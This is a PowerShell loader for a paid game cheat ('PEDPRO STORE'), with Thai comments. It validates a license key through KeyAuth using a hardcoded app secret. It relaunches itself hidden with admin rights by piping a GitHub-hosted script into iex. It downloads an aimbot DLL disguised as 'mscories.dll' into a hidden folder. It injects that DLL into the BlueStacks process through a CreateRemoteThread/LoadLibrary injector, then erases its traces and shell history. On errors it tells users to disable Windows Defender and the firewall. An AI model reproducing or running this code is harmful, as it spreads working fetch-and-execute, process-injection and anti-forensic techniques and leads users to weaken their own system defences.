# ============================================================
# dugduy.ps1 - PEDPRO STORE (FIXED CONNECTION)
# ============================================================

# บังคับให้ PowerShell ใช้ TLS 1.2 ในการเชื่อมต่อ (แก้ปัญหา Connection Error)
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# ข้อมูล API จากภาพของคุณ
$OwnerID   = "vGgzXjkfQj" 
$AppName   = "GetX"
$AppSecret = "c394cd53bf649b6c32ba7c7b37685554e7d44638323fc0858e87cc2f0088910d" 
$Version   = "1.0"

Clear-Host
Write-Host "========================================" -ForegroundColor Cyan
Write-Host "       WELCOME TO PEDPRO STORE          " -ForegroundColor White
Write-Host "========================================" -ForegroundColor Cyan

# 1. KeyAuth Login Process
$userKey = Read-Host "[?] Please enter your License Key"
Write-Host "[*] Connecting to Auth Server..." -ForegroundColor Gray

$authUrl = "https://keyauth.win/api/1.1/?type=init&name=$AppName&ownerid=$OwnerID&ver=$Version"

try {
    # เพิ่ม User-Agent เพื่อป้องกันโดน Cloudflare บล็อก
    $initReq = Invoke-RestMethod -Uri $authUrl -Method Get -TimeoutSec 15 -UserAgent "Mozilla/5.0"
    
    if ($initReq.success -eq "true") {
        $sessionid = $initReq.sessionid
        $loginUrl = "https://keyauth.win/api/1.1/?type=license&key=$userKey&sessionid=$sessionid&name=$AppName&ownerid=$OwnerID"
        $loginReq = Invoke-RestMethod -Uri $loginUrl -Method Get -UserAgent "Mozilla/5.0"

        if ($loginReq.success -ne "true") {
            Write-Host "[-] ACCESS DENIED: $($loginReq.message)" -ForegroundColor Red
            Write-Host "[!] Press any key to exit..." -ForegroundColor Yellow
            $null = [Console]::ReadKey(); exit
        }
        Write-Host "[+] Login Successful! Welcome." -ForegroundColor Green
    } else {
        Write-Host "[-] INIT ERROR: $($initReq.message)" -ForegroundColor Red
        Write-Host "[!] Check AppName/OwnerID again." -ForegroundColor Yellow
        $null = [Console]::ReadKey(); exit
    }
} catch {
    Write-Host "[-] CRITICAL CONNECTION ERROR" -ForegroundColor Red
    Write-Host "[!] Details: $($_.Exception.Message)" -ForegroundColor Yellow
    Write-Host "[*] SUGGESTION: Turn off Windows Defender / Firewall and try again." -ForegroundColor Gray
    Write-Host "[*] Press any key to close..." -ForegroundColor Gray
    $null = [Console]::ReadKey(); exit
}

# 2. Administrator Privilege Check
if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "[*] Requesting Admin rights..." -ForegroundColor Yellow
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"iex ((iwr 'https://raw.githubusercontent.com/getx796-Harem/cmdFreefire/main/dugduy.ps1' -UseBasicParsing).Content)`"" -Verb RunAs
    exit
}

# 3. File & Stealth Setup (ตัวเดิมของคุณ)
$url = "https://github.com/getx796-Harem/cmdFreefire/releases/download/v1.0/AimbotFemaleFix.dll"
$fakeName = "mscories.dll"
$workDir = "$env:LOCALAPPDATA\Microsoft\CLR_v4.0"
$dllPath = Join-Path $workDir $fakeName
$targetProcess = "HD-Player"

if (Test-Path $workDir) { Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue }
New-Item -ItemType Directory -Path $workDir -Force | Out-Null
attrib +h +s $workDir

# 4. Silent Download
Write-Host "[*] Downloading components..." -ForegroundColor Gray
$ProgressPreference = 'SilentlyContinue'
Invoke-WebRequest -Uri $url -OutFile $dllPath -UseBasicParsing -ErrorAction SilentlyContinue

# 5. C# Injector Source (ตัวเดิมของคุณ)
$Source = @"
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Text;

public class Injector {
    [DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
    [DllImport("kernel32.dll")] public static extern IntPtr GetModuleHandle(string lpModuleName);
    [DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32.dll")] public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll")] public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);
    [DllImport("kernel32.dll")] public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    public static void Inject(int pid, string dllPath) {
        IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
        IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)((dllPath.Length + 1) * Marshal.SizeOf(typeof(char))), 0x3000, 0x40);
        IntPtr outSize;
        WriteProcessMemory(hProcess, addr, Encoding.Default.GetBytes(dllPath), (uint)((dllPath.Length + 1) * Marshal.SizeOf(typeof(char))), out outSize);
        IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
        CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, addr, 0, IntPtr.Zero);
    }
}
"@

# 6. Injection Logic
if (Test-Path $dllPath) {
    $proc = Get-Process -Name $targetProcess -ErrorAction SilentlyContinue
    if (!$proc) {
        Write-Host "[*] Launching BlueStacks..." -ForegroundColor Yellow
        if (Test-Path "C:\Program Files\BlueStacks_nxt\HD-Player.exe") {
            Start-Process "C:\Program Files\BlueStacks_nxt\HD-Player.exe"
            Start-Sleep -Seconds 8
            $proc = Get-Process -Name $targetProcess -ErrorAction SilentlyContinue
        }
    }

    if ($proc) {
        Write-Host "[+] Injecting to $targetProcess..." -ForegroundColor Cyan
        Add-Type -TypeDefinition $Source -ErrorAction SilentlyContinue
        [Injector]::Inject($proc.Id, $dllPath)
        Write-Host "[+] SUCCESS: Inject Complete!" -ForegroundColor Green
    }
}

# 7. Trace Cleanup
Write-Host "[*] Cleaning traces..." -ForegroundColor Gray
Start-Sleep -Seconds 5
Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue
Clear-History -ErrorAction SilentlyContinue

Write-Host "[*] Finished. Closing..." -ForegroundColor DarkGray
Start-Sleep -Seconds 2
exit
